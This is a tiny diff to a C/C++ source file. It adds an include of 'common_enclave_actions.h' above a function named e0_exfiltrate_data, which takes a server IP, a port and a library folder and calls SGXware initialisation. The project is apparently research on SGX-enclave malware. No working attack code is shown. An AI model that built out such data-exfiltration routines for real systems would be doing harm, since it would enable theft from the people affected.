@@ -3,6 +3,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#include "common_enclave_actions.h"
+
+
 void e0_exfiltrate_data(char* server_ip, int iport, char* library_folder)
 {
 	if (!SGXware::getInstance()->initUser(server_ip, iport, library_folder))
